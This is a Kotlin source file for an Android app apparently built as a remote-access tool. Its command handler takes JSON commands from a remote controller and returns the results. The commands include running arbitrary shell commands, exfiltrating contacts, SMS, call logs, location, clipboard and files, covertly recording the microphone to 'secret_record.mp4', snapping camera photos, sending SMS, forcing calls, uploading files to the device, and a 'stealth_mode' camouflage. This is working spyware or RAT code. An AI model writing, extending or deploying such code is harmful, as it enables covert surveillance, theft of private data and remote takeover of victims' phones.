package com.example.devicecontrol

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.widget.Toast
import org.json.JSONObject
import org.json.JSONArray
import android.os.Handler
import android.os.Looper
import android.media.AudioManager
import android.hardware.camera2.CameraManager
import android.speech.tts.TextToSpeech
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.hardware.SensorManager
import android.hardware.Sensor
import java.io.BufferedReader
import java.io.InputStreamReader
import android.content.ClipboardManager
import android.content.ClipData
import java.util.Locale
import android.location.LocationManager
import android.net.Uri
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.net.wifi.WifiManager
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import android.Manifest
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.graphics.ImageFormat
import android.os.HandlerThread

import android.os.Vibrator
import android.os.VibratorManager
import android.os.VibrationEffect
import android.media.RingtoneManager
import android.provider.CallLog
import android.app.WallpaperManager
import android.content.Intent
import android.content.pm.ApplicationInfo
import java.net.URL
import android.graphics.BitmapFactory

class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {

    private var tts: TextToSpeech? = null
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    private var isTorchOn = false

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale("id", "ID")
        }
    }

    private fun checkPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
    }

    fun handle(jsonStr: String, sendResponse: (String) -> Unit) {
        var cmdId = ""
        try {
            val json = JSONObject(jsonStr)
            var command = json.getString("command").trim()
            var textArg = json.optString("text", "")
            cmdId = json.optString("id", "")

            // Support concatenated commands (e.g. "photo back") from some dashboards
            if (command.contains(" ")) {
                val parts = command.split(" ", limit = 2)
                command = parts[0]
                if (textArg.isEmpty()) textArg = parts[1]
            }

            when (command) {
                // ============== FASE 1 ==============
                "ping" -> {
                    sendResponse(createResponse(cmdId, "pong", "Alive"))
                }
                "get_device_info" -> {
                    val info = JSONObject().apply {
                        put("model", Build.MODEL)
                        put("brand", Build.BRAND)
                        put("sdk", Build.VERSION.SDK_INT)
                        put("release", Build.VERSION.RELEASE)
                    }
                    sendResponse(createResponse(cmdId, "device_info", info))
                }
                "get_battery" -> {
                    val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    sendResponse(createResponse(cmdId, "battery_level", level))
                }
                "show_toast" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, textArg.ifEmpty { "Remote Command" }, Toast.LENGTH_SHORT).show()
                    }
                    sendResponse(createResponse(cmdId, "toast", "Displayed: $textArg"))
                }
                "shell" -> {
                    try {
                        val process = Runtime.getRuntime().exec(textArg.ifEmpty { "ls" })
                        val reader = BufferedReader(InputStreamReader(process.inputStream))
                        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
                        
                        val output = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = it } != null) output.append(line).append("\n")
                        while (errorReader.readLine().also { line = it } != null) output.append(line).append("\n")
                        process.waitFor()
                        sendResponse(createResponse(cmdId, "shell_output", output.toString()))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Shell failed: ${e.message}"))
                    }
                }
                "get_volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    val volInfo = JSONObject().apply {
                        put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                        put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                        put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                        put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                        put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                    }
                    sendResponse(createResponse(cmdId, "volume_info", volInfo))
                }
                "set_volume" -> {
                    val parts = textArg.split(" ")
                    if (parts.size >= 2) {
                        try {
                            val type = parts[0]
                            val vol = parts[1].toIntOrNull() ?: 0
                            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                            val stream = when (type.lowercase()) {
                                "music" -> AudioManager.STREAM_MUSIC
                                "ring" -> AudioManager.STREAM_RING
                                "alarm" -> AudioManager.STREAM_ALARM
                                "notification" -> AudioManager.STREAM_NOTIFICATION
                                "voice" -> AudioManager.STREAM_VOICE_CALL
                                else -> AudioManager.STREAM_MUSIC
                            }
                            
                            val max = am.getStreamMaxVolume(stream)
                            val finalVol = if (vol > max) max else if (vol < 0) 0 else vol
                            
                            // Eksekusi set volume dengan penanganan exception khusus Android 12+
                            am.setStreamVolume(stream, finalVol, 0)
                            sendResponse(createResponse(cmdId, "success", "Volume $type set to $finalVol (Max: $max)"))
                        } catch (se: SecurityException) {
                            sendResponse(createResponse(cmdId, "error", "Ditolak OS (Izin DND/Modify Audio): ${se.message}"))
                        } catch (e: Exception) {
                            sendResponse(createResponse(cmdId, "error", "Gagal set volume: ${e.message}"))
                        }
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Format: set_volume [type] [level]"))
                    }
                }
                "torch" -> {
                    try {
                        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = camManager.cameraIdList[0] 
                        val state = if (textArg.lowercase() == "on") true else if (textArg.lowercase() == "off") false else !isTorchOn
                        camManager.setTorchMode(cameraId, state)
                        isTorchOn = state
                        sendResponse(createResponse(cmdId, "success", "Torch $state"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Torch err: ${e.message}"))
                    }
                }
                "set_polling_mode" -> {
                    val mode = textArg.lowercase()
                    val isTurbo = mode == "short" || mode == "turbo"
                    val prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("turbo_mode", isTurbo).apply()
                    
                    val restartIntent = Intent(context, ControlService::class.java).apply {
                        action = "RESTART_POLLING"
                    }
                    if (Build.VERSION.SDK_INT >= 26) {
                        context.startForegroundService(restartIntent)
                    } else {
                        context.startService(restartIntent)
                    }
                    sendResponse(createResponse(cmdId, "success", "Mode: ${if (isTurbo) "Turbo" else "Normal"}"))
                }
                "tts" -> {
                    tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                    sendResponse(createResponse(cmdId, "success", "Speaking..."))
                }
                "notify" -> {
                    val parts = textArg.split("|")
                    val title = if (parts.isNotEmpty()) parts[0] else "System Alert"
                    val content = if (parts.size > 1) parts[1] else "Message from server"
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        val channel = NotificationChannel("remote_notify", "Remote Messages", NotificationManager.IMPORTANCE_HIGH)
                        notificationManager.createNotificationChannel(channel)
                    }
                    val notification = NotificationCompat.Builder(context, "remote_notify")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle(title)
                        .setContentText(content)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .build()
                        
                    notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
                    sendResponse(createResponse(cmdId, "success", "Notification pushed"))
                }
                "sensors" -> {
                    val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                    val list = sm.getSensorList(Sensor.TYPE_ALL)
                    val result = JSONArray()
                    for (s in list) {
                        val obj = JSONObject()
                        obj.put("name", s.name)
                        obj.put("vendor", s.vendor)
                        obj.put("type", s.type)
                        result.put(obj)
                    }
                    sendResponse(createResponse(cmdId, "sensor_list", result))
                }
                "clipboard" -> {
                    try {
                        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        if (cm.hasPrimaryClip() && cm.primaryClip != null && cm.primaryClip!!.itemCount > 0) {
                            val txt = cm.primaryClip!!.getItemAt(0).text.toString()
                            sendResponse(createResponse(cmdId, "clipboard", txt))
                        } else {
                            // Kebijakan Android 10+ FGS Background Restrict Clipboard
                            sendResponse(createResponse(cmdId, "clipboard", "[Kosong atau Diblokir Kebijakan Background Android 10+]"))
                        }
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal baca clipboard: ${e.message}"))
                    }
                }

                // ============== FASE 2 ==============
                "location" -> {
                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) || checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        var loc: android.location.Location? = null
                        val providers = lm.getProviders(true)
                        
                        for (provider in providers) {
                            try {
                                val l = lm.getLastKnownLocation(provider)
                                if (l != null && (loc == null || l.accuracy < loc.accuracy)) {
                                    loc = l
                                }
                            } catch (e: SecurityException) {}
                        }
                        
                        if (loc != null) {
                            val obj = JSONObject().apply {
                                put("lat", loc.latitude)
                                put("lon", loc.longitude)
                                put("accuracy", loc.accuracy)
                                put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
                            }
                            sendResponse(createResponse(cmdId, "location_data", obj))
                        } else {
                            sendResponse(createResponse(cmdId, "error", "Lokasi belum Cache/GPS mati. Coba buka GMaps di device aslinya."))
                        }
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing LOCATION permission"))
                    }
                }
                "contacts" -> {
                    if (checkPerm(Manifest.permission.READ_CONTACTS)) {
                        val result = JSONArray()
                        val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
                        cursor?.let {
                            var count = 0
                            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            while (it.moveToNext() && count < 200) {
                                val obj = JSONObject()
                                obj.put("name", it.getString(nameIdx))
                                obj.put("number", it.getString(numIdx))
                                result.put(obj)
                                count++
                            }
                            it.close()
                        }
                        sendResponse(createResponse(cmdId, "contacts_list", result))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing READ_CONTACTS permission"))
                    }
                }
                "sms_list" -> {
                    if (checkPerm(Manifest.permission.READ_SMS)) {
                        val result = JSONArray()
                        val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
                        cursor?.let {
                            var count = 0
                            val addrIdx = it.getColumnIndex("address")
                            val bodyIdx = it.getColumnIndex("body")
                            val dateIdx = it.getColumnIndex("date")
                            while (it.moveToNext() && count < 50) {
                                val obj = JSONObject()
                                obj.put("from", it.getString(addrIdx))
                                obj.put("body", it.getString(bodyIdx))
                                obj.put("date", it.getLong(dateIdx))
                                result.put(obj)
                                count++
                            }
                            it.close()
                        }
                        sendResponse(createResponse(cmdId, "sms_inbox", result))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing READ_SMS permission"))
                    }
                }
                "sms_send" -> {
                    if (checkPerm(Manifest.permission.SEND_SMS)) {
                        val parts = textArg.split("|")
                        if (parts.size >= 2) {
                            val number = parts[0]
                            val message = parts[1]
                            SmsManager.getDefault().sendTextMessage(number, null, message, null, null)
                            sendResponse(createResponse(cmdId, "success", "SMS Sent to $number"))
                        } else {
                            sendResponse(createResponse(cmdId, "error", "Format error. Use: [number]|[message]"))
                        }
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing SEND_SMS permission"))
                    }
                }
                "wifi_scan" -> {
                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) && checkPerm(Manifest.permission.ACCESS_WIFI_STATE)) {
                        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                        try { wm.startScan() } catch (e: Exception) {}
                        
                        val results = wm.scanResults
                        val arr = JSONArray()
                        for (res in results) {
                            val obj = JSONObject()
                            obj.put("ssid", res.SSID)
                            obj.put("bssid", res.BSSID)
                            obj.put("level", res.level)
                            arr.put(obj)
                        }
                        
                        // Fallback jika hasil list kosong pada sistem Android modern (throttle/limit OS)
                        if (arr.length() == 0) {
                            val obj = JSONObject()
                            obj.put("Pesan Sistem", "OS mencegah background WiFi Scan. Pastikan GPS/Location ON dan Izin Location di set ke 'Allow all the time'.")
                            
                            val currentWifi = wm.connectionInfo
                            if (currentWifi != null && currentWifi.networkId != -1) {
                                obj.put("status", "Hanya deteksi WiFi terhubung:")
                                obj.put("ssid", currentWifi.ssid?.replace("\"", ""))
                                obj.put("bssid", currentWifi.bssid)
                                obj.put("level", currentWifi.rssi)
                            }
                            arr.put(obj)
                        }
                        
                        sendResponse(createResponse(cmdId, "wifi_networks", arr))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Missing WIFI/LOC permissions"))
                    }
                }
                // ============== FASE 3 ==============
                "play_sound" -> {
                    val url = textArg
                    if (url.isNotEmpty()) {
                        Thread {
                            try {
                                val mp = android.media.MediaPlayer()
                                mp.setDataSource(url)
                                mp.prepare()
                                mp.start()
                                sendResponse(createResponse(cmdId, "success", "Memainkan suara dari $url"))
                            } catch (e: Exception) {
                                sendResponse(createResponse(cmdId, "error", "Gagal memutar: ${e.message}"))
                            }
                        }.start()
                    } else sendResponse(createResponse(cmdId, "error", "URL tidak boleh kosong (format: /cmd play_sound url)"))
                }
                "record_sound" -> {
                    if (checkPerm(Manifest.permission.RECORD_AUDIO)) {
                        val durationSec = textArg.toLongOrNull() ?: 5L // default merekam 5 detik
                        val durationMs = durationSec * 1000L
                        val file = java.io.File(context.cacheDir, "secret_record.mp4")
                        Thread {
                            try {
                                val mr = android.media.MediaRecorder()
                                mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                                mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                                mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                                mr.setOutputFile(file.absolutePath)
                                mr.prepare()
                                mr.start()
                                Thread.sleep(durationMs)
                                mr.stop()
                                mr.release()
                                
                                val bytes = file.readBytes()
                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
                                sendResponse(createResponse(cmdId, "audio_base64", b64))
                            } catch (e: Exception) {
                                sendResponse(createResponse(cmdId, "error", "Gagal merekam: ${e.message}"))
                            }
                        }.start()
                    } else sendResponse(createResponse(cmdId, "error", "Izin RECORD_AUDIO belum di-ALLOW"))
                }
                "photo" -> {
                    if (checkPerm(Manifest.permission.CAMERA)) {
                        val isFront = textArg.lowercase() == "front"
                        Thread {
                            try {
                                val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                                var targetCameraId: String? = null
                                
                                for (camId in camManager.cameraIdList) {
                                    val chars = camManager.getCameraCharacteristics(camId)
                                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
                                    if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                        targetCameraId = camId; break
                                    } else if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                                        targetCameraId = camId; break
                                    }
                                }
                                
                                if (targetCameraId == null) targetCameraId = camManager.cameraIdList.firstOrNull()
                                
                                if (targetCameraId != null) {
                                    val handlerThread = HandlerThread("CameraBackground").apply { start() }
                                    val handler = Handler(handlerThread.looper)
                                    
                                    val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
                                    var isCaptured = false
                                    var activeCamera: CameraDevice? = null
                                    var activeSession: CameraCaptureSession? = null
                                    
                                    imageReader.setOnImageAvailableListener({ reader ->
                                        if (!isCaptured) {
                                            isCaptured = true
                                            try {
                                                val image = reader.acquireLatestImage()
                                                val buffer = image.planes[0].buffer
                                                val bytes = ByteArray(buffer.remaining())
                                                buffer.get(bytes)
                                                image.close()
                                                
                                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                                                sendResponse(createResponse(cmdId, "photo_base64", b64))
                                            } catch (e: Exception) {
                                                sendResponse(createResponse(cmdId, "error", "Gagal memproses gambar: ${e.message}"))
                                            } finally {
                                                reader.close()
                                                activeSession?.close()
                                                activeCamera?.close()
                                                handlerThread.quitSafely()
                                            }
                                        }
                                    }, handler)
                                    
                                    // Buka kamera
                                    camManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                                        override fun onOpened(camera: CameraDevice) {
                                            activeCamera = camera
                                            try {
                                                val surfaces = listOf(imageReader.surface)
                                                camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                                                    override fun onConfigured(session: CameraCaptureSession) {
                                                        activeSession = session
                                                        try {
                                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                                            captureBuilder.addTarget(imageReader.surface)
                                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                            session.capture(captureBuilder.build(), null, handler)
                                                        } catch (e: Exception) {
                                                            sendResponse(createResponse(cmdId, "error", "Gagal di stage Capture: ${e.message}"))
                                                            session.close()
                                                            camera.close()
                                                        }
                                                    }
                                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                                        sendResponse(createResponse(cmdId, "error", "Capture Session Failed"))
                                                        session.close()
                                                        camera.close()
                                                    }
                                                }, handler)
                                            } catch (e: Exception) {
                                                sendResponse(createResponse(cmdId, "error", "Session Error: ${e.message}"))
                                                camera.close()
                                            }
                                        }
                                        override fun onDisconnected(camera: CameraDevice) { camera.close() }
                                        override fun onError(camera: CameraDevice, error: Int) {
                                            sendResponse(createResponse(cmdId, "error", "Camera Device Error code: $error"))
                                            camera.close()
                                        }
                                    }, handler)
                                } else {
                                    sendResponse(createResponse(cmdId, "error", "Kamera target tidak ditemukan!"))
                                }
                            } catch (e: Exception) {
                                sendResponse(createResponse(cmdId, "error", "Termux-Camera Hack Gagal: ${e.message}"))
                            }
                        }.start()
                    } else sendResponse(createResponse(cmdId, "error", "Izin CAMERA belum di-ALLOW OS Android!"))
                }
                "vibrate" -> {
                    val durationSec = textArg.toLongOrNull() ?: 2L
                    val durationMs = durationSec * 1000L
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                            vibratorManager.defaultVibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION")
                            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                            } else {
                                vibrator.vibrate(durationMs)
                            }
                        }
                        sendResponse(createResponse(cmdId, "vibrate", "Perangkat bergetar selama $durationSec detik"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal Vibrate: ${e.message}"))
                    }
                }
                "open_url" -> {
                    try {
                        var url = textArg
                        if (!url.startsWith("http://") && !url.startsWith("https://")) { url = "https://$url" }
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
                        context.startActivity(intent)
                        sendResponse(createResponse(cmdId, "open_url", "Membuka browser ke: $url"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal membuka URL: ${e.message}"))
                    }
                }
                "play_alarm" -> {
                    try {
                        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                        audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
                        
                        val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                         ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                        val ringtone = RingtoneManager.getRingtone(context, alarmUri)
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            ringtone.audioAttributes = android.media.AudioAttributes.Builder()
                                .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                                .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                                .build()
                        }
                        ringtone.play()
                        
                        // Mainkan selama 10 detik lalu matikan
                        Handler(Looper.getMainLooper()).postDelayed({ ringtone.stop() }, 10000)
                        sendResponse(createResponse(cmdId, "play_alarm", "Alarm darurat dibunyikan dengan volume MAX selama 10 detik!"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal memutar alarm: ${e.message}"))
                    }
                }
                "get_call_logs" -> {
                    if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
                        try {
                            val limit = textArg.toIntOrNull() ?: 20
                            val logs = JSONArray()
                            val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
                            cursor?.use {
                                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                                
                                var count = 0
                                while (it.moveToNext() && count < limit) {
                                    val typeCode = it.getInt(typeIdx)
                                    val typeStr = when(typeCode) {
                                        CallLog.Calls.INCOMING_TYPE -> "Masuk"
                                        CallLog.Calls.OUTGOING_TYPE -> "Keluar"
                                        CallLog.Calls.MISSED_TYPE -> "Terlewat"
                                        CallLog.Calls.REJECTED_TYPE -> "Ditolak"
                                        else -> "Lainnya"
                                    }
                                    logs.put(JSONObject().apply {
                                        put("number", it.getString(numIdx))
                                        put("name", it.getString(nameIdx) ?: "Tidak Dikenal")
                                        put("type", typeStr)
                                        put("date", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(java.util.Date(it.getLong(dateIdx))))
                                        put("duration_sec", it.getString(durationIdx))
                                    })
                                    count++
                                }
                            }
                            sendResponse(createResponse(cmdId, "call_logs", logs))
                        } catch (e: Exception) {
                            sendResponse(createResponse(cmdId, "error", "Gagal baca call log: ${e.message}"))
                        }
                    } else sendResponse(createResponse(cmdId, "error", "Izin READ_CALL_LOG belum di-ALLOW"))
                }
                "get_installed_apps" -> {
                    try {
                        val limit = textArg.toIntOrNull() ?: 0 // 0 means all non-system
                        val pm = context.packageManager
                        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                        val arr = JSONArray()
                        var count = 0
                        for (appInfo in apps) {
                            // Filter only non-system apps if wanted, logic here filters out core system if needed
                            if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                                arr.put(JSONObject().apply {
                                    put("name", pm.getApplicationLabel(appInfo).toString())
                                    put("package", appInfo.packageName)
                                })
                                count++
                                if (limit in 1..count) break
                            }
                        }
                        sendResponse(createResponse(cmdId, "installed_apps", arr))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal tarik App List: ${e.message}"))
                    }
                }
                "set_wallpaper" -> {
                    Thread {
                        try {
                            val urlParsed = URL(textArg)
                            val bitmap = BitmapFactory.decodeStream(urlParsed.openConnection().getInputStream())
                            val wm = WallpaperManager.getInstance(context)
                            wm.setBitmap(bitmap)
                            sendResponse(createResponse(cmdId, "set_wallpaper", "Wallpaper berhasil diubah secara drastis!"))
                        } catch (e: Exception) {
                            sendResponse(createResponse(cmdId, "error", "Gagal Ganti Wallpaper: Pastikan argument adalah Direct URL Image Valid - ${e.message}"))
                        }
                    }.start()
                }
                "dial_number" -> {
                    if (checkPerm(Manifest.permission.CALL_PHONE)) {
                        try {
                            var number = textArg.replace("#", "%23")
                            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
                            context.startActivity(intent)
                            sendResponse(createResponse(cmdId, "dial_number", "Memaksa perangkat menelepon/men-dial: $textArg"))
                        } catch (e: Exception) {
                            sendResponse(createResponse(cmdId, "error", "Dialer Gagal: ${e.message}"))
                        }
                    } else sendResponse(createResponse(cmdId, "error", "Izin CALL_PHONE belum di-ALLOW"))
                }
                "ls" -> {
                    try {
                        val path = if (textArg.isEmpty()) "/storage/emulated/0" else textArg
                        val dir = java.io.File(path)
                        val arr = JSONArray()
                        if (dir.exists() && dir.isDirectory) {
                            dir.listFiles()?.forEach {
                                val obj = JSONObject().apply {
                                    put("name", it.name)
                                    put("is_dir", it.isDirectory)
                                    put("size", if (it.isFile) it.length() else 0)
                                    put("path", it.absolutePath)
                                }
                                arr.put(obj)
                            }
                            sendResponse(createResponse(cmdId, "ls_result", arr))
                        } else {
                            sendResponse(createResponse(cmdId, "error", "Direktori tidak ditemukan atau akses ditolak: $path"))
                        }
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "File Explorer Gagal: ${e.message}"))
                    }
                }
                "download" -> {
                    Thread {
                        try {
                            val file = java.io.File(textArg)
                            if (file.exists() && file.isFile) {
                                val bytes = file.readBytes()
                                val encoded = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
                                val payload = JSONObject().apply {
                                    put("name", file.name)
                                    put("data", encoded)
                                }
                                sendResponse(createResponse(cmdId, "file_download", payload))
                            } else {
                                sendResponse(createResponse(cmdId, "error", "File tidak valid atau tidak ditemukan."))
                            }
                        } catch (e: Exception) {
                            sendResponse(createResponse(cmdId, "error", "Download gagal: ${e.message}"))
                        }
                    }.start()
                }
                "upload" -> {
                    Thread {
                        try {
                            val parts = textArg.split("^^^")
                            if (parts.size == 2) {
                                val destPath = parts[0]
                                val b64Data = parts[1]
                                val bytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT)
                                val file = java.io.File(destPath)
                                file.writeBytes(bytes)
                                sendResponse(createResponse(cmdId, "upload_success", "File berhasil disusupkan ke: $destPath"))
                            } else {
                                sendResponse(createResponse(cmdId, "error", "Format upload salah."))
                            }
                        } catch (e: Exception) {
                            sendResponse(createResponse(cmdId, "error", "Upload Gagal: ${e.message}"))
                        }
                    }.start()
                }
                "hide_app" -> {
                    try {
                        val prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE)
                        prefs.edit().putBoolean("stealth_mode", true).apply()
                        
                        // Pastikan komponen tetap ENABLE agar icon tidak berubah jadi App Info
                        val pm = context.packageManager
                        val alias = android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias")
                        pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                        
                        sendResponse(createResponse(cmdId, "hide_app", "Mode Kamuflase Aktif: Ikon tetap ada tapi Control Panel terkunci."))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal menyembunyikan: ${e.message}"))
                    }
                }
                "unhide_app" -> {
                    try {
                        val prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE)
                        prefs.edit().putBoolean("stealth_mode", false).apply()
                        
                        val pm = context.packageManager
                        val alias = android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias")
                        pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 0)
                        
                        sendResponse(createResponse(cmdId, "unhide_app", "Control Panel berhasil dimunculkan kembali!"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Gagal memunculkan panel: ${e.message}"))
                    }
                }
                else -> {
                    sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
                }
            }
        } catch (e: Exception) {
            sendResponse(createResponse(cmdId, "error", e.message ?: "Logic Error"))
        }
    }

    private fun createResponse(cmdId: String, type: String, data: Any): String {
        return JSONObject().apply {
            if (cmdId.isNotEmpty()) put("id", cmdId)
            put("type", type)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }.toString()
    }
}
